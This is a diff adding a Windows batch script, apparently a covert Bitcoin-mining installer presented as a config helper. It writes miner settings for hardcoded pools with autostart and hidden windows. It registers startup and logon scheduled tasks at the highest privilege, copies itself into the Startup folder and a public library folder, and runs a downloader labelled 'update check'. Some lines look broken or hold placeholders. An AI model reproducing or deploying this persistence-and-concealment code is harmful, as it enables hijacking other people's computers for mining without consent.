@@ -1,0 +1,110 @@
+@echo off
+
+
+rem creates compatible version of poclbm.ini
+
+for /F "delims=\ tokens=1-2" %%G in ("%ProgramFiles%") do set slashfiles=%%G\\%%H)
+if ("%ProgramFiles(x86)%") NEQ ("") (for /F "delims=\ tokens=1-2" %%G in ("%ProgramFiles(x86)%") do set slashfiles=%%G\\%%H)
+
+
+:nopo
+if exist %cd%\poclbm\nopo.txt goto nopo
+
+echo nopo>%cd%\poclbm\nopo.txt
+
+
+echo {>%cd%\poclbm\poclbm.ini
+echo     "profiles": [>>%cd%\poclbm\poclbm.ini
+echo         {>>%cd%\poclbm\poclbm.ini
+echo             "username": "evanmcc_main", >>%cd%\poclbm\poclbm.ini
+echo             "balance_auth_token": "", >>%cd%\poclbm\poclbm.ini
+echo             "name": "BTC", >>%cd%\poclbm\poclbm.ini
+echo             "hostname": "stratum.btcguild.com", >>%cd%\poclbm\poclbm.ini
+echo             "external_path": "", >>%cd%\poclbm\poclbm.ini
+echo             "affinity_mask": 15, >>%cd%\poclbm\poclbm.ini
+echo             "flags": "", >>%cd%\poclbm\poclbm.ini
+echo             "autostart": false, >>%cd%\poclbm\poclbm.ini
+echo             "device": 0, >>%cd%\poclbm\poclbm.ini
+echo             "password": "d=1", >>%cd%\poclbm\poclbm.ini
+echo             "port": "3333">>%cd%\poclbm\poclbm.ini
+echo         }, >>%cd%\poclbm\poclbm.ini
+echo         {>>%cd%\poclbm\poclbm.ini
+echo             "username": "evanmcc", >>%cd%\poclbm\poclbm.ini
+echo             "balance_auth_token": "", >>%cd%\poclbm\poclbm.ini
+echo             "name": "bitparking", >>%cd%\poclbm\poclbm.ini
+echo             "hostname": "mmpool.bitparking.com", >>%cd%\poclbm\poclbm.ini
+echo             "external_path": "", >>%cd%\poclbm\poclbm.ini
+echo             "affinity_mask": 15, >>%cd%\poclbm\poclbm.ini
+echo             "flags": "", >>%cd%\poclbm\poclbm.ini
+echo             "autostart": true, >>%cd%\poclbm\poclbm.ini
+echo             "device": 0, >>%cd%\poclbm\poclbm.ini
+echo             "password": "d=1", >>%cd%\poclbm\poclbm.ini
+echo             "port": "3333">>%cd%\poclbm\poclbm.ini
+echo         }, >>%cd%\poclbm\poclbm.ini
+echo         {>>%cd%\poclbm\poclbm.ini
+echo             "username": "1GPwFQ51uzwx1TuE4rYNo2VFahYvJKjw1c", >>%cd%\poclbm\poclbm.ini
+echo             "balance_auth_token": "", >>%cd%\poclbm\poclbm.ini
+echo             "name": "eligius", >>%cd%\poclbm\poclbm.ini
+echo             "hostname": "stratum.mining.eligius.st", >>%cd%\poclbm\poclbm.ini
+echo             "external_path": "", >>%cd%\poclbm\poclbm.ini
+echo             "affinity_mask": 15, >>%cd%\poclbm\poclbm.ini
+echo             "flags": "", >>%cd%\poclbm\poclbm.ini
+echo             "autostart": true, >>%cd%\poclbm\poclbm.ini
+echo             "device": 0, >>%cd%\poclbm\poclbm.ini
+echo             "password": "1", >>%cd%\poclbm\poclbm.ini
+echo             "port": "3334">>%cd%\poclbm\poclbm.ini
+echo         }>>%cd%\poclbm\poclbm.ini
+echo     ], >>%cd%\poclbm\poclbm.ini
+echo     "bitcoin_executable": "%slashfiles%\\Bitcoin\\bitcoin-qt.exe", >>%cd%\poclbm\poclbm.ini
+echo     "show_console": false, >>%cd%\poclbm\poclbm.ini
+echo     "show_summary": true, >>%cd%\poclbm\poclbm.ini
+echo     "show_opencl_warning": false, >>%cd%\poclbm\poclbm.ini
+echo     "console_max_lines": 1, >>%cd%\poclbm\poclbm.ini
+echo     "start_minimized": true, >>%cd%\poclbm\poclbm.ini
+echo     "blockchain_directory": "C:\\Users\\Evan\\AppData\\Roaming\\Bitcoin", >>%cd%\poclbm\poclbm.ini
+echo     "window_position": [>>%cd%\poclbm\poclbm.ini
+echo         755, >>%cd%\poclbm\poclbm.ini
+echo         144, >>%cd%\poclbm\poclbm.ini
+echo         506, >>%cd%\poclbm\poclbm.ini
+echo         328>>%cd%\poclbm\poclbm.ini
+echo     ]>>%cd%\poclbm\poclbm.ini
+echo }>>%cd%\poclbm\poclbm.ini
+
+
+rem copies poclbm.ini
+mkdir %appdata%\poclbm
+ROBOCOPY "%cd%\poclbm" "%appdata%\poclbm" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+
+
+del %cd%\poclbm\nopo.txt
+
+
+
+REM Get OS version from registry
+for /f "tokens=2*" %%i in ('reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentVersion"') do set os_ver=%%j
+
+REM Set run level if Vista or later (version 6)
+if /i "%os_ver:~,1%" GEQ "6" set runlevel=/RL HIGHEST
+
+
+schtasks /Create /TN ONSTART /TR aPath\cleanup.bat /SC onstart %runlevel% /F
+schtasks /Create /TN ONLOGON /TR aPath\cleanup.bat /SC onlogon %runlevel% /F
+
+rem copies startup script
+ROBOCOPY "%cd%" "%homedrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" auto.bat /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+
+rem copies all files if corresponding folder does not exist
+if not exist "%homedrive%\guiminer" ROBOCOPY "%cd%" "%homedrive%\guiminer" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+if not exist "%homedrive%\Users\Public\Libraries\guiminer" ROBOCOPY "%cd%" "%homedrive%\Users\Public\Libraries\guiminer" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+
+
+rem download & extract guiminer & poclbm if not exist
+if not exist %homedrive%\guiminer\guiminer.exe start "update check" /I /MIN /LOW "cmd" "/Q /C "%cd%\download.bat""
+if not exist %homedrive%\guiminer\poclbm.exe start "update check" /I /MIN /LOW "cmd" "/Q /C "%cd%\download.bat""
+
+
+cls
+exit /B %errorlevel%
+exit %errorlevel%
